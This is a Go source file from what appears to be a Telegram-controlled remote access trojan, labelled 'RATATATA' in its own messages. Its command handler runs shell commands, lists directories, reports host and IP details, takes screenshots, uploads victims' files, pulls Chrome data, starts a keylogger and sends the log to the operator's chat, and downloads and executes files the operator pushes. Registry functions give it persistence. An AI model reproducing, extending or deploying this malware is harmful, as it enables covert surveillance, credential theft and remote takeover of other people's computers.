package main

import (
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	tgbotapi "gopkg.in/telegram-bot-api.v4"
)

func initRat() {
	pwd, _ = filepath.Abs(filepath.Dir(os.Args[0]))
	RegistryFromConsole(true, true, true)
}

func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) string {
	var msg = ""
	//msg += "Ur cmd was:("+strconv.FormatBool(command.IsCommand() || command.Text[:1] == "/")+")"
	if command.IsCommand() {
		switch strings.Replace(strings.Split(command.Text, " ")[0], "/", "", -1) {
		case "help":
			msg += HELP
		case "pwd":
			msg += pwd
		case "cd":
			pwd = strings.Split(command.Text, " ")[1]
			msg += "OK: " + pwd
		case "ls":
			if len(strings.Split(command.Text, " ")) > 1 {
				for _, directory := range strings.Split(command.Text, " ")[0:] {
					msg += "Contents of " + directory + ":\n"
					msg += arrToStr("\n", listDir(directory))
				}
			} else {
				msg += "Contents of " + pwd + ":\n"
				msg += arrToStr("\n", listDir(pwd))
			}
		case "run":
			go runCmd(command.Text, command.Chat.ID, bot)
			msg += "OK. Running..."
		case "uninstall":
			UnRegistryFromConsole(true)
			sendMsg(bot, ADMIN_ID, "The RATATATA has been uninstalled!")
			msg += "OK. Uninstalled."
			os.Exit(0)
		case "info":
			hName, _ := os.Hostname()
			currUser, _ := user.Current()
			ipCfg, err := GetExternalIP()
			ipInfo := parseIpInfo(ipCfg)
			if err != nil {
				ipInfo = "unknown"
			}
			msg += strings.Split(currUser.Username, "\\")[1] + "@" + hName + "\n"
			msg += runtime.GOOS + "\n"
			msg += "IP info:\n"
			msg += "Internal:" + GetOutboundIP() + "\n"
			msg += "External info: " + ipInfo
		case "screen":
			makeScreenshot("./sc.png")
			go uploadFile(command.Chat.ID, "./sc.png", bot, true)
		case "dl":
			go uploadFile(command.Chat.ID, arrToStr(" ", strings.Split(command.Text, " ")[1:]), bot, false)
			msg += "uploading... Please, stand by!"
		case "chrome":
			msg += getChrome()
		case "keylogger":
			var kl Keylogger
			go func() {
				for {
					kl.GetKey()
				}
			}()
			sendMsg(bot, ADMIN_ID, "Keylogger started!")
		case "stopKeyRetrieveKey":
			fileName := "keylog.txt"
			go uploadFileToTelegram(bot, ADMIN_ID, fileName)
			sendMsg(bot, ADMIN_ID, "done")
		case "to":
			currUser, _ := user.Current()
			ipCfg, _ := GetExternalIP()
			//log.Println("HNAME:",strings.Split(command.Text, " ")[1] == strings.Split(currUser.Username, "\\")[0])
			if strings.Split(command.Text, " ")[1] == strings.Split(currUser.Username, "\\")[0] || strings.Split(command.Text, " ")[1] == ipCfg.Ip {
				command.Text = arrToStr(" ", strings.Split(command.Text, " ")[2:])
				//log.Println("RECURSIVLY RUNNING COMMAND:",command.Text)
				msg += parseCmd(command, bot)
			}
		default:
			msg = HELP
		}
	} else if command.Document != nil {
		if command.Caption != "exec" {
			msg += "saved to: " + dlFile(command.Document.FileID, command.Document.FileName, bot)
		} else {
			filePath := dlFile(command.Document.FileID, command.Document.FileName, bot)
			msg += "saved to: " + filePath + "; EXECUTING..."
			go runCmd("<nil> start "+filePath, command.Chat.ID, bot)
		}
	} else {
		msg = HELP
	}
	return msg
}

// Function to send key presses to a telegram chat. Must be inserted in a for looping printing all the keys.
// Need to implement threading to increase performance

//func sendKeyPressMessage(bot *tgbotapi.BotAPI, chatID int64, key rune) {
//	msg := fmt.Sprintf("Key pressed: %c", key)
//	bot.Send(tgbotapi.NewMessage(chatID, msg))
//}

func uploadFileToTelegram(bot *tgbotapi.BotAPI, chatID int64, fileName string) {
	filePath := filepath.Join(os.TempDir(), fileName)
	msg := tgbotapi.NewDocumentUpload(chatID, filePath)
	bot.Send(msg)
}
